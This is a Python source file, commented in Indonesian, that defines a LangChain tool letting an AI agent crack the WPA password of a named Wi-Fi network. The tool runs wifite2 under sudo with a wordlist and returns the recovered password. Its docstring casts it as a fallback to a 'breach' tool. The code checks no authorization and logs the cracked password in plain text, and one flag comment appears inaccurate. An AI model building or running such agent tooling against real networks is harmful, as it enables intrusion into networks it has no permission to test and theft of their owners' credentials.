# tools/wireless_auditor.py

import subprocess
import logging
import json
import os
from langchain.agents import tool

# Menggunakan logger yang sama dari proyek
logger = logging.getLogger('AIST_Logger')

def _run_command(command: list, timeout: int) -> subprocess.CompletedProcess:
    """Menjalankan command di shell dengan logging dan timeout."""
    logger.info(f"Executing command: {' '.join(command)}")
    try:
        # Menggunakan Popen untuk kontrol yang lebih baik atas proses yang berjalan lama
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=timeout)
        
        logger.info(f"Command finished. RC: {process.returncode}")
        if stdout:
            logger.info(f"STDOUT: {stdout.strip()}")
        if stderr:
            logger.warning(f"STDERR: {stderr.strip()}")
            
        return subprocess.CompletedProcess(command, process.returncode, stdout, stderr)

    except subprocess.TimeoutExpired:
        process.kill()
        stdout, stderr = process.communicate()
        logger.warning(f"Command timed out after {timeout} seconds. Process killed.")
        logger.warning(f"STDOUT before timeout: {stdout.strip()}")
        logger.warning(f"STDERR before timeout: {stderr.strip()}")
        raise
    except Exception as e:
        logger.error(f"An exception occurred: {e}")
        raise

def _parse_wifite_cracked_file(essid: str) -> str | None:
    """Membaca file cracked.json dari wifite dan mencari password."""
    cracked_file = "hs/cracked.json"
    logger.info(f"Checking for results in '{cracked_file}' for ESSID '{essid}'")
    
    if not os.path.exists(cracked_file):
        logger.warning(f"Wifite result file not found: {cracked_file}")
        return None
        
    with open(cracked_file, 'r') as f:
        data = json.load(f)
    
    for network in data:
        if network.get('essid') == essid:
            password = network.get('password')
            logger.info(f"Password found for '{essid}' in wifite results: '{password}'")
            return password
            
    logger.warning(f"Password for '{essid}' not found in wifite results file.")
    return None


@tool
def audit_wifi_with_wifite(essid: str, wordlist_path: str, timeout_seconds: int = 300) -> str:
    """
    Gunakan tool ini SEBAGAI UPAYA KEDUA jika tool `breach_wifi_network_manual`
    gagal menemukan password. Tool ini menjalankan serangan otomatis
    menggunakan wifite2 untuk menargetkan ESSID tertentu.
    """
    logger.info(f"--- Starting Automated Wi-Fi Audit with Wifite2 for ESSID: {essid} ---")
    
    # Hapus file cracked.json lama untuk memastikan hasil yang bersih
    if os.path.exists("hs/cracked.json"):
        os.remove("hs/cracked.json")

    command = [
        "sudo", "wifite",
        "--kill",               # Menghentikan proses yang mengganggu
        "--essid", essid,       # Menargetkan SSID spesifik
        "--dict", wordlist_path,# Menggunakan wordlist yang diberikan
        "--no-wps",             # Fokus pada serangan WPA (handshake)
        "--cracked"             # Berhenti setelah password ditemukan
    ]

    try:
        _run_command(command, timeout=timeout_seconds)
    except subprocess.TimeoutExpired:
        logger.warning(f"Wifite run timed out. Checking for any cracked passwords found before timeout...")
    except Exception as e:
        return f"Wifite run failed with a critical error: {e}"

    # Setelah wifite selesai (baik normal, cracked, atau timeout), periksa hasilnya
    password = _parse_wifite_cracked_file(essid)
    
    if password:
        return f"SUCCESS! Wifite found the password for '{essid}'. The password is: '{password}'"
    else:
        return f"FAILURE. Wifite automated audit completed for '{essid}', but the password was NOT FOUND."